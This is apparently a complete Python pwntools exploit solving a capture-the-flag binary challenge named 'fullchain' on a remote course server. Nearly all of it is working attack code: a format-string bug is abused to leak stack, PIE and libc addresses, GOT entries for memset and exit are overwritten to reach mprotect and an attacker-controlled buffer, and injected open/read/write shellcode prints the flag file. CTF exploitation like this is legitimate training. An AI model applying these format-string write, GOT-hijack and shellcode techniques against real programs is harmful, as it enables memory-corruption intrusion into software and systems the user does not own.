from typing import List
from pwn import *
from pwnlib.util.packing import u64, p64

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"

# Command Sender
def send_cmd2srv(buf: str, cmd: str, payload: bytes = b""):
    global r
    r.sendlineafter(b"global or local > ", buf.encode())
    r.sendlineafter(b"set, read or write > ", cmd.encode())
    
    if cmd == "read":
        r.send(payload)
    elif cmd == "set":
        r.sendlineafter("data > ", b"1000")
        r.sendlineafter("length > ", b"7")

# Set Addr on Stack
def set_addr_on_stack(addr1: int):
    # Check if Payload Have 0x0a, 0x20, 0x00, That will cause uninteded behavior
    for i in range(6):
        tmp =  (addr1 >> 8 * i) & 0xFF
        if tmp == 0x0a or tmp == 0x20 or tmp == 0x00:
            log.info("[WARNING]: Set Address contains unallowed char that will cause Error! (" + hex(tmp) + ")")
            break

    payload = b"_"*16 + p64(addr1)
    send_cmd2srv("local", "read", payload)

# CNT_extender
def cnt_extend_to_5(cnt_addr: int):
    set_addr_on_stack(cnt_addr)
    send_cmd2srv("local", "write%16$n")

    log.info("[SET]: CNT successfully set to 5!")

def cnt_extend_to_n(cnt_addr: int, value: int):
    frt_write_value2addr(cnt_addr, value)

    log.info(f"[SET]: CNT successfully set to {hex(value)}!")

# Leak Stack Value
def leak_stack_val(frt_idx: int) -> int:
    if frt_idx >= 10:
        return -1
    
    send_cmd2srv("local", f"write%{frt_idx}$lx")
    return int(r.recv(17)[5:].decode(), 16)

# Write Address with Value
def frt_write_value2addr(addr: int, value: int):
    # Write 4 byte a time
    bits = [ 
        value & 0xFFFF, 
        (value >> 16) & 0xFFFF,
        (value >> 32) & 0xFFFF,
        (value >> 48) & 0xFFFF,
    ]

    for i in range(4):
        if bits[i] == 0:
            continue
        # Setup Addr in Memory
        set_addr_on_stack(addr+i*2)
        
        # Prepare Format String
        payload = f"%{bits[i]}c%16$hn\n"

        # Write to Global
        send_cmd2srv("global", "read", payload.encode())
        send_cmd2srv("global", "write")       


if __name__ == "__main__":
    FLAG_PATH = "/home/fullchain/flag"
    FLAG_LENGTH = 18

    # Start The Process !
    # r = gdb.debug("./fullchain/share/fullchain",
    #     """
    #     aslr on
    #     b *chal+75
    #     # b mywrite
    #     # b myread
    #     c
    #     """
    # )
    # r = process("./fullchain/share/fullchain")
    r = remote("edu-ctf.zoolab.org", 30201)

    # Leak CNT Position
    ADDR_CNT = leak_stack_val(7) - 0xC
    log.info("[GET]: Leak CNT Variable Address: " + hex(ADDR_CNT))

    # CNT Extend
    cnt_extend_to_5(ADDR_CNT)
    cnt_extend_to_n(ADDR_CNT, 0x2000)

    # Leak PIE Base Address
    BASE_PIE = leak_stack_val(8) - 0x1800
    log.info("[GET]: Leak PIE Base: " + hex(BASE_PIE))

    # Leak Libc Base Address
    ADDR_PRINTF_GOT = BASE_PIE + 0x116b + 0x2edd
    log.info("[CALCULATION]: Printf GOT Address: " + hex(ADDR_PRINTF_GOT))
    set_addr_on_stack(ADDR_PRINTF_GOT)
    send_cmd2srv("local", "write%16$s")
    BASE_LIBC = u64(r.recv(11)[5:]+b"\x00"*2) - 0x64e10
    log.info("[GET]: Leak Libc Base: " + hex(BASE_LIBC))

    # Leak Global Var Position
    send_cmd2srv("global", "read", "%7$lx\n")
    send_cmd2srv("global", "write")
    ADDR_GLOBAL_VAR = int(r.recv(12).decode(), 16)
    log.info("[GET]: Leak GLOBAL var Address: " + hex(ADDR_GLOBAL_VAR))

    # Hijack memset to mprotect
    ADDR_MPROTECT = BASE_LIBC + 0x11bb00
    ADDR_MEMSET_GOT = BASE_PIE + 0x118b + 0x2ecd
    frt_write_value2addr(ADDR_MEMSET_GOT, ADDR_MPROTECT)
    log.info("[HIJACK]: Memset got had been hijack to mprotect!")

    # Hijack Exit to Global Var
    ADDR_EXIT_GOT = BASE_PIE + 0x11bb + 0x2eb5
    ADDR_MYSET_RET = BASE_PIE + 0x1531
    frt_write_value2addr(ADDR_EXIT_GOT, ADDR_MYSET_RET)
    log.info(f"[HIJACK]: Exit got had been hijack to {hex(ADDR_MYSET_RET)} temporarily.")

    # Write GLOBAL Page to PTR
    frt_write_value2addr(ADDR_CNT+0x4, (ADDR_GLOBAL_VAR & 0xFFFF) - 0xb0)
    log.info(f"[HIJACK]: PTR had been set to GLOBAL-0xb0")

    # Trigger memset to go mprotect
    send_cmd2srv("ggg", "set")
    log.info("[PWN]: Global had been set to RWX !")

    # Prepare File Name and Ptr
    frt_write_value2addr(ADDR_CNT+0x4, (ADDR_GLOBAL_VAR & 0xFFFF) + 0x38)
    log.info(f"[HIJACK]: PTR had been set to GLOBAL+0x38")
    send_cmd2srv("ggg", "read", FLAG_PATH.encode()+b"\n")
    frt_write_value2addr(ADDR_GLOBAL_VAR+0x30, ADDR_GLOBAL_VAR+0x38)
    log.info(f"[PWN]: FLAG Path ({FLAG_PATH}) had been set to GLOBAL+0x38, addr had been write to GLOBAL+0x30")

    # Hijack Exit to Global Var
    frt_write_value2addr(ADDR_EXIT_GOT, ADDR_GLOBAL_VAR)
    log.info("[HIJACK]: Exit got had been hijack to GLOBAL var address !")

    # Write Shell Code on the Global
    # Open File
    OpenShellCode = """
        push QWORD PTR [rip+0x2a]
        pop rdi
        push 0x02
        pop rax
        xor rsi, rsi
        xor rdx, rdx
        syscall
        ret
    """

    send_cmd2srv("global", "read", asm(OpenShellCode)+b"\n")
    send_cmd2srv("local", "ggg")
    log.info("[PWN]: Open " + FLAG_PATH + " success !")

    # Read Flag
    ReadShellCode = """
        push QWORD PTR [rip+0x2a]
        pop rsi
        xor rax, rax
        push 3
        pop rdi
        push 0x40
        pop rdx
        syscall
        ret
    """

    send_cmd2srv("global", "read", asm(ReadShellCode)+b"\n")
    send_cmd2srv("local", "ggg")
    log.info("[PWN]: Read " + FLAG_PATH + " success !")

    WriteShellCode = """
        push QWORD PTR [rip+0x2a]
        pop rsi
        push 1
        pop rax
        push 1
        pop rdi
        push 0x40
        pop rdx
        syscall
        ret
    """

    send_cmd2srv("global", "read", asm(WriteShellCode)+b"\n")
    send_cmd2srv("local", "ggg")
    log.info("[PWN]: Write 2 stdout !! Completed !!")

    print("Final Flag: " + r.recv(FLAG_LENGTH).decode())
